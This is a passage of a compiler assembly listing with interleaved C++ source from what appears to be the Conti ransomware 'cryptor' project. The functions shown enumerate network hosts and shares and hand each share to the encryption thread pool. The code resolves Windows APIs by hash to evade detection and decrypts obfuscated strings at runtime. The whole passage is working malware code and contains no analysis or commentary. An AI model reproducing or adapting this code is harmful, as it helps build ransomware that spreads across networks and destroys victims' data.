	01 00 00	 mov	 rbx, QWORD PTR [rsp+256]
  00472	48 8b 75 ff	 mov	 rsi, QWORD PTR ShareInfoBuffer$[rbp-137]
$LN6@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 665  : 	pFunction = (DWORD(WINAPI*)(LPVOID))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x09223458, 51);//GetProcAddress(hNetApi32, OBFA("NetApiBufferFree"));

  00476	ba 11 00 00 00	 mov	 edx, 17
  0047b	41 b8 58 34 22
	09		 mov	 r8d, 153236568		; 09223458H
  00481	44 8d 4a 22	 lea	 r9d, QWORD PTR [rdx+34]
  00485	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 666  : 	return pFunction(Buffer);

  0048a	48 8b ce	 mov	 rcx, rsi
  0048d	ff d0		 call	 rax
  0048f	48 8b b4 24 b8
	00 00 00	 mov	 rsi, QWORD PTR [rsp+184]
$LN223@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 273  : }

  00497	48 8b 4d 17	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-137]
  0049b	48 33 cc	 xor	 rcx, rsp
  0049e	e8 00 00 00 00	 call	 __security_check_cookie
  004a3	48 81 c4 c0 00
	00 00		 add	 rsp, 192		; 000000c0H
  004aa	41 5f		 pop	 r15
  004ac	41 5e		 pop	 r14
  004ae	41 5d		 pop	 r13
  004b0	41 5c		 pop	 r12
  004b2	5d		 pop	 rbp
  004b3	c3		 ret	 0
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z ENDP ; network_scanner::EnumShares
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?HostHandler@@YAKPEAX@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 96
ShareList$ = 128
__$ArrayPad$ = 144
pArg$ = 176
?HostHandler@@YAKPEAX@Z PROC				; HostHandler, COMDAT

; 279  : {

$LN355:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 7c 24 10	 mov	 QWORD PTR [rsp+16], rdi
  0000a	55		 push	 rbp
  0000b	48 8d 6c 24 a9	 lea	 rbp, QWORD PTR [rsp-87]
  00010	48 81 ec a0 00
	00 00		 sub	 rsp, 160		; 000000a0H
  00017	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001e	48 33 c4	 xor	 rax, rsp
  00021	48 89 45 47	 mov	 QWORD PTR __$ArrayPad$[rbp-73], rax

; 280  : 	network_scanner::SHARE_LIST ShareList;
; 281  : 	TAILQ_INIT(&ShareList);

  00025	48 8d 45 37	 lea	 rax, QWORD PTR ShareList$[rbp-73]
  00029	48 c7 45 37 00
	00 00 00	 mov	 QWORD PTR ShareList$[rbp-73], 0
  00031	48 89 45 3f	 mov	 QWORD PTR ShareList$[rbp-65], rax
  00035	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL3@HostHandle:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00040	ba 0f 00 00 00	 mov	 edx, 15
  00045	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  0004b	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  0004f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  00054	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  0005b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 287  : 		PHOST_INFO HostInfo = TAILQ_FIRST(&g_HostList);

  0005d	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_HostList@@3Uhost_list_@@A

; 288  : 		if (HostInfo == NULL) {

  00064	48 85 ff	 test	 rdi, rdi
  00067	75 68		 jne	 SHORT $LN9@HostHandle
  00069	0f 1f 80 00 00
	00 00		 npad	 7
$LL5@HostHandle:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00070	ba 0f 00 00 00	 mov	 edx, 15
  00075	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  0007b	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
  0007f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  00084	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  0008b	ff d0		 call	 rax

; 467  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb09422e9, 69);//GetProcAddress(hKernel32, OBFA("Sleep"));

  0008d	ba 0f 00 00 00	 mov	 edx, 15
  00092	41 b8 e9 22 94
	b0		 mov	 r8d, -1332469015	; b09422e9H
  00098	44 8d 4a 36	 lea	 r9d, QWORD PTR [rdx+54]
  0009c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 468  : 	return pFunction(dwMilliseconds);

  000a1	b9 e8 03 00 00	 mov	 ecx, 1000		; 000003e8H
  000a6	ff d0		 call	 rax

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  000a8	ba 0f 00 00 00	 mov	 edx, 15
  000ad	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  000b3	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  000b7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  000bc	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  000c3	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 287  : 		PHOST_INFO HostInfo = TAILQ_FIRST(&g_HostList);

  000c5	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_HostList@@3Uhost_list_@@A

; 288  : 		if (HostInfo == NULL) {

  000cc	48 85 ff	 test	 rdi, rdi
  000cf	74 9f		 je	 SHORT $LL5@HostHandle
$LN9@HostHandle:

; 296  : 		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);

  000d1	48 8b 4f 30	 mov	 rcx, QWORD PTR [rdi+48]
  000d5	48 8b 47 38	 mov	 rax, QWORD PTR [rdi+56]
  000d9	48 85 c9	 test	 rcx, rcx
  000dc	74 06		 je	 SHORT $LN16@HostHandle
  000de	48 89 41 38	 mov	 QWORD PTR [rcx+56], rax
  000e2	eb 07		 jmp	 SHORT $LN17@HostHandle
$LN16@HostHandle:
  000e4	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A+8, rax
$LN17@HostHandle:
  000eb	48 8b 4f 38	 mov	 rcx, QWORD PTR [rdi+56]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000ef	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 296  : 		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);

  000f4	48 8b 47 30	 mov	 rax, QWORD PTR [rdi+48]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000f8	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  000fe	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 296  : 		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);

  00102	48 89 01	 mov	 QWORD PTR [rcx], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00105	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  0010a	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  00111	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 299  : 		if (HostInfo->dwAddres == STOP_MARKER) {

  00113	83 3f ff	 cmp	 DWORD PTR [rdi], -1	; ffffffffH
  00116	75 20		 jne	 SHORT $LN18@HostHandle

; 300  : 
; 301  : 			free(HostInfo);

  00118	48 8b cf	 mov	 rcx, rdi
  0011b	e8 00 00 00 00	 call	 free
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  00120	ba 0f 00 00 00	 mov	 edx, 15
  00125	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  0012b	44 8d 4a 38	 lea	 r9d, QWORD PTR [rdx+56]
  0012f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  00134	33 c9		 xor	 ecx, ecx
  00136	ff d0		 call	 rax
$LN18@HostHandle:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 306  : 		network_scanner::EnumShares(HostInfo->wszAddress, &ShareList);

  00138	48 8d 4f 04	 lea	 rcx, QWORD PTR [rdi+4]
  0013c	48 8d 55 37	 lea	 rdx, QWORD PTR ShareList$[rbp-73]
  00140	e8 00 00 00 00	 call	 ?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z ; network_scanner::EnumShares

; 307  : 		while (!TAILQ_EMPTY(&ShareList))

  00145	48 8b 5d 37	 mov	 rbx, QWORD PTR ShareList$[rbp-73]
  00149	48 85 db	 test	 rbx, rbx
  0014c	0f 84 cf 01 00
	00		 je	 $LN11@HostHandle
  00152	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL10@HostHandle:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00160	c6 45 d7 00	 mov	 BYTE PTR $T1[rbp-73], 0
  00164	c6 45 d8 27	 mov	 BYTE PTR $T1[rbp-72], 39 ; 00000027H
  00168	c6 45 d9 38	 mov	 BYTE PTR $T1[rbp-71], 56 ; 00000038H
  0016c	c6 45 da 14	 mov	 BYTE PTR $T1[rbp-70], 20
  00170	c6 45 db 38	 mov	 BYTE PTR $T1[rbp-69], 56 ; 00000038H
  00174	c6 45 dc 04	 mov	 BYTE PTR $T1[rbp-68], 4
  00178	c6 45 dd 38	 mov	 BYTE PTR $T1[rbp-67], 56 ; 00000038H
  0017c	c6 45 de 19	 mov	 BYTE PTR $T1[rbp-66], 25
  00180	c6 45 df 38	 mov	 BYTE PTR $T1[rbp-65], 56 ; 00000038H
  00184	c6 45 e0 14	 mov	 BYTE PTR $T1[rbp-64], 20
  00188	c6 45 e1 38	 mov	 BYTE PTR $T1[rbp-63], 56 ; 00000038H
  0018c	c6 45 e2 6f	 mov	 BYTE PTR $T1[rbp-62], 111 ; 0000006fH
  00190	c6 45 e3 38	 mov	 BYTE PTR $T1[rbp-61], 56 ; 00000038H
  00194	c6 45 e4 23	 mov	 BYTE PTR $T1[rbp-60], 35 ; 00000023H
  00198	c6 45 e5 38	 mov	 BYTE PTR $T1[rbp-59], 56 ; 00000038H
  0019c	c6 45 e6 74	 mov	 BYTE PTR $T1[rbp-58], 116 ; 00000074H
  001a0	c6 45 e7 38	 mov	 BYTE PTR $T1[rbp-57], 56 ; 00000038H
  001a4	c6 45 e8 67	 mov	 BYTE PTR $T1[rbp-56], 103 ; 00000067H
  001a8	c6 45 e9 38	 mov	 BYTE PTR $T1[rbp-55], 56 ; 00000038H
  001ac	c6 45 ea 56	 mov	 BYTE PTR $T1[rbp-54], 86 ; 00000056H
  001b0	c6 45 eb 38	 mov	 BYTE PTR $T1[rbp-53], 56 ; 00000038H
  001b4	c6 45 ec 79	 mov	 BYTE PTR $T1[rbp-52], 121 ; 00000079H
  001b8	c6 45 ed 38	 mov	 BYTE PTR $T1[rbp-51], 56 ; 00000038H
  001bc	c6 45 ee 04	 mov	 BYTE PTR $T1[rbp-50], 4
  001c0	c6 45 ef 38	 mov	 BYTE PTR $T1[rbp-49], 56 ; 00000038H
  001c4	c6 45 f0 19	 mov	 BYTE PTR $T1[rbp-48], 25
  001c8	c6 45 f1 38	 mov	 BYTE PTR $T1[rbp-47], 56 ; 00000038H
  001cc	c6 45 f2 7e	 mov	 BYTE PTR $T1[rbp-46], 126 ; 0000007eH
  001d0	c6 45 f3 38	 mov	 BYTE PTR $T1[rbp-45], 56 ; 00000038H
  001d4	c6 45 f4 32	 mov	 BYTE PTR $T1[rbp-44], 50 ; 00000032H
  001d8	c6 45 f5 38	 mov	 BYTE PTR $T1[rbp-43], 56 ; 00000038H
  001dc	c6 45 f6 67	 mov	 BYTE PTR $T1[rbp-42], 103 ; 00000067H
  001e0	c6 45 f7 38	 mov	 BYTE PTR $T1[rbp-41], 56 ; 00000038H
  001e4	c6 45 f8 60	 mov	 BYTE PTR $T1[rbp-40], 96 ; 00000060H
  001e8	c6 45 f9 38	 mov	 BYTE PTR $T1[rbp-39], 56 ; 00000038H
  001ec	c6 45 fa 23	 mov	 BYTE PTR $T1[rbp-38], 35 ; 00000023H
  001f0	c6 45 fb 38	 mov	 BYTE PTR $T1[rbp-37], 56 ; 00000038H
  001f4	c6 45 fc 67	 mov	 BYTE PTR $T1[rbp-36], 103 ; 00000067H
  001f8	c6 45 fd 38	 mov	 BYTE PTR $T1[rbp-35], 56 ; 00000038H
  001fc	c6 45 fe 56	 mov	 BYTE PTR $T1[rbp-34], 86 ; 00000056H
  00200	c6 45 ff 38	 mov	 BYTE PTR $T1[rbp-33], 56 ; 00000038H
  00204	c6 45 00 32	 mov	 BYTE PTR $T1[rbp-32], 50 ; 00000032H
  00208	c6 45 01 38	 mov	 BYTE PTR $T1[rbp-31], 56 ; 00000038H
  0020c	c6 45 02 04	 mov	 BYTE PTR $T1[rbp-30], 4
  00210	c6 45 03 38	 mov	 BYTE PTR $T1[rbp-29], 56 ; 00000038H
  00214	c6 45 04 19	 mov	 BYTE PTR $T1[rbp-28], 25
  00218	c6 45 05 38	 mov	 BYTE PTR $T1[rbp-27], 56 ; 00000038H
  0021c	c6 45 06 79	 mov	 BYTE PTR $T1[rbp-26], 121 ; 00000079H
  00220	c6 45 07 38	 mov	 BYTE PTR $T1[rbp-25], 56 ; 00000038H
  00224	c6 45 08 67	 mov	 BYTE PTR $T1[rbp-24], 103 ; 00000067H
  00228	c6 45 09 38	 mov	 BYTE PTR $T1[rbp-23], 56 ; 00000038H
  0022c	c6 45 0a 1b	 mov	 BYTE PTR $T1[rbp-22], 27
  00230	c6 45 0b 38	 mov	 BYTE PTR $T1[rbp-21], 56 ; 00000038H
  00234	c6 45 0c 56	 mov	 BYTE PTR $T1[rbp-20], 86 ; 00000056H
  00238	c6 45 0d 38	 mov	 BYTE PTR $T1[rbp-19], 56 ; 00000038H
  0023c	c6 45 0e 44	 mov	 BYTE PTR $T1[rbp-18], 68 ; 00000044H
  00240	c6 45 0f 38	 mov	 BYTE PTR $T1[rbp-17], 56 ; 00000038H
  00244	c6 45 10 38	 mov	 BYTE PTR $T1[rbp-16], 56 ; 00000038H
  00248	c6 45 11 38	 mov	 BYTE PTR $T1[rbp-15], 56 ; 00000038H
  0024c	0f b6 45 d8	 movzx	 eax, BYTE PTR $T1[rbp-72]

; 58   :         return m_isDecrypted;

  00250	0f b6 45 d7	 movzx	 eax, BYTE PTR $T1[rbp-73]

; 63   :         if (!isDecrypted())

  00254	84 c0		 test	 al, al
  00256	75 5d		 jne	 SHORT $LN327@HostHandle

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00258	45 33 c9	 xor	 r9d, r9d
  0025b	0f 1f 44 00 00	 npad	 5
$LL328@HostHandle:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00260	42 0f b6 4c 0d
	d8		 movzx	 ecx, BYTE PTR $T1[rbp+r9-72]

; 40   :     return (a % n + n) % n;

  00266	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0026b	83 e9 38	 sub	 ecx, 56			; 00000038H
  0026e	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00272	41 f7 e8	 imul	 r8d
  00275	41 03 d0	 add	 edx, r8d
  00278	c1 fa 06	 sar	 edx, 6
  0027b	8b c2		 mov	 eax, edx
  0027d	c1 e8 1f	 shr	 eax, 31
  00280	03 d0		 add	 edx, eax
  00282	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00285	44 2b c0	 sub	 r8d, eax
  00288	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0028d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00291	41 f7 e8	 imul	 r8d
  00294	41 03 d0	 add	 edx, r8d
  00297	c1 fa 06	 sar	 edx, 6
  0029a	8b c2		 mov	 eax, edx
  0029c	c1 e8 1f	 shr	 eax, 31
  0029f	03 d0		 add	 edx, eax
  002a1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002a4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002a7	46 88 44 0d d8	 mov	 BYTE PTR $T1[rbp+r9-72], r8b
  002ac	49 ff c1	 inc	 r9
  002af	49 83 f9 3a	 cmp	 r9, 58			; 0000003aH
  002b3	72 ab		 jb	 SHORT $LL328@HostHandle
$LN327@HostHandle:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 311  : 			logs::Write(OBFW(L"Starting search on share %s."), ShareInfo->wszSharePath);

  002b5	48 8b 55 37	 mov	 rdx, QWORD PTR ShareList$[rbp-73]
  002b9	48 8d 4d d8	 lea	 rcx, QWORD PTR $T1[rbp-72]
  002bd	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 312  : 			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo->wszSharePath);

  002c2	48 8b d3	 mov	 rdx, rbx
  002c5	48 8d 4d 17	 lea	 rcx, QWORD PTR $T2[rbp-73]
  002c9	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  002ce	48 8b d0	 mov	 rdx, rax
  002d1	b9 01 00 00 00	 mov	 ecx, 1
  002d6	e8 00 00 00 00	 call	 ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask

; 313  : 			TAILQ_REMOVE(&ShareList, ShareInfo, Entries);

  002db	48 8b 8b 00 7d
	00 00		 mov	 rcx, QWORD PTR [rbx+32000]
  002e2	48 8b 83 08 7d
	00 00		 mov	 rax, QWORD PTR [rbx+32008]
  002e9	48 85 c9	 test	 rcx, rcx
  002ec	74 09		 je	 SHORT $LN19@HostHandle
  002ee	48 89 81 08 7d
	00 00		 mov	 QWORD PTR [rcx+32008], rax
  002f5	eb 04		 jmp	 SHORT $LN20@HostHandle
$LN19@HostHandle:
  002f7	48 89 45 3f	 mov	 QWORD PTR ShareList$[rbp-65], rax
$LN20@HostHandle:
  002fb	48 8b 93 08 7d
	00 00		 mov	 rdx, QWORD PTR [rbx+32008]

; 314  : 			free(ShareInfo);

  00302	48 8b cb	 mov	 rcx, rbx
  00305	48 8b 83 00 7d
	00 00		 mov	 rax, QWORD PTR [rbx+32000]
  0030c	48 89 02	 mov	 QWORD PTR [rdx], rax
  0030f	e8 00 00 00 00	 call	 free
  00314	48 8b 5d 37	 mov	 rbx, QWORD PTR ShareList$[rbp-73]
  00318	48 85 db	 test	 rbx, rbx
  0031b	0f 85 3f fe ff
	ff		 jne	 $LL10@HostHandle
$LN11@HostHandle:

; 315  : 
; 316  : 		}
; 317  : 
; 318  : 		free(HostInfo);

  00321	48 8b cf	 mov	 rcx, rdi
  00324	e8 00 00 00 00	 call	 free

; 319  : 
; 320  : 	}

  00329	e9 12 fd ff ff	 jmp	 $LL3@HostHandle
?HostHandler@@YAKPEAX@Z ENDP				; HostHandler
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?AddHost@@YAHK@Z
_TEXT	SEGMENT
dwAddres$GSCopy$ = 48
temp$ = 56
__$ArrayPad$ = 72
dwAddres$ = 96
?AddHost@@YAHK@Z PROC					; AddHost, COMDAT

; 331  : {

$LN33:
  00000	40 53		 push	 rbx
  00002	48 83 ec 50	 sub	 rsp, 80			; 00000050H
  00006	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0000d	48 33 c4	 xor	 rax, rsp
  00010	48 89 44 24 48	 mov	 QWORD PTR __$ArrayPad$[rsp], rax

; 332  : 	if (g_HostEntry) {

  00015	48 8b 15 00 00
	00 00		 mov	 rdx, QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA ; g_HostEntry
  0001c	89 4c 24 30	 mov	 DWORD PTR dwAddres$GSCopy$[rsp], ecx
  00020	48 85 d2	 test	 rdx, rdx
  00023	74 1c		 je	 SHORT $LN3@AddHost

; 333  : 		INT i = 0;
; 334  : 		while (g_HostEntry->h_addr_list[i] != NULL) {

  00025	48 8b 52 18	 mov	 rdx, QWORD PTR [rdx+24]
  00029	48 8b 02	 mov	 rax, QWORD PTR [rdx]
  0002c	48 85 c0	 test	 rax, rax
  0002f	74 10		 je	 SHORT $LN3@AddHost
$LL2@AddHost:

; 335  : 			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry->h_addr_list[i++];

  00031	48 8d 52 08	 lea	 rdx, QWORD PTR [rdx+8]

; 336  : 			if (dwCurrentAddr == dwAddres) {

  00035	39 08		 cmp	 DWORD PTR [rax], ecx
  00037	74 2c		 je	 SHORT $LN25@AddHost

; 333  : 		INT i = 0;
; 334  : 		while (g_HostEntry->h_addr_list[i] != NULL) {

  00039	48 8b 02	 mov	 rax, QWORD PTR [rdx]
  0003c	48 85 c0	 test	 rax, rax
  0003f	75 f0		 jne	 SHORT $LL2@AddHost
$LN3@AddHost:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  00041	b9 40 00 00 00	 mov	 ecx, 64			; 00000040H
  00046	e8 00 00 00 00	 call	 malloc
  0004b	0f 57 c0	 xorps	 xmm0, xmm0
  0004e	48 8b d8	 mov	 rbx, rax

; 6    : 	memset(mem, 0, Size);

  00051	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0
  00054	0f 11 40 10	 movups	 XMMWORD PTR [rax+16], xmm0
  00058	0f 11 40 20	 movups	 XMMWORD PTR [rax+32], xmm0
  0005c	0f 11 40 30	 movups	 XMMWORD PTR [rax+48], xmm0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 343  : 	if (!HostInfo) {

  00060	48 85 c0	 test	 rax, rax
  00063	75 15		 jne	 SHORT $LN9@AddHost
$LN25@AddHost:

; 344  : 		return FALSE;

  00065	33 c0		 xor	 eax, eax

; 373  : }

  00067	48 8b 4c 24 48	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  0006c	48 33 cc	 xor	 rcx, rsp
  0006f	e8 00 00 00 00	 call	 __security_check_cookie
  00074	48 83 c4 50	 add	 rsp, 80			; 00000050H
  00078	5b		 pop	 rbx
  00079	c3		 ret	 0
$LN9@AddHost:

; 345  : 	}
; 346  : 
; 347  : 	DWORD dwAddress = INET_ADDRSTRLEN;
; 348  : 	SOCKADDR_IN temp;
; 349  : 	temp.sin_addr.s_addr = dwAddres;

  0007a	8b 44 24 30	 mov	 eax, DWORD PTR dwAddres$GSCopy$[rsp]
  0007e	48 89 7c 24 68	 mov	 QWORD PTR [rsp+104], rdi

; 350  : 	temp.sin_port = 0;

  00083	33 ff		 xor	 edi, edi
  00085	89 44 24 3c	 mov	 DWORD PTR temp$[rsp+4], eax

; 351  : 	temp.sin_family = AF_INET;

  00089	c7 44 24 38 02
	00 00 00	 mov	 DWORD PTR temp$[rsp], 2

; 352  : 	HostInfo->dwAddres = dwAddres;

  00091	89 03		 mov	 DWORD PTR [rbx], eax

; 353  : 
; 354  : 	if (dwAddres != STOP_MARKER) {

  00093	83 7c 24 30 ff	 cmp	 DWORD PTR dwAddres$GSCopy$[rsp], -1 ; ffffffffH
  00098	74 3e		 je	 SHORT $LN11@AddHost
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

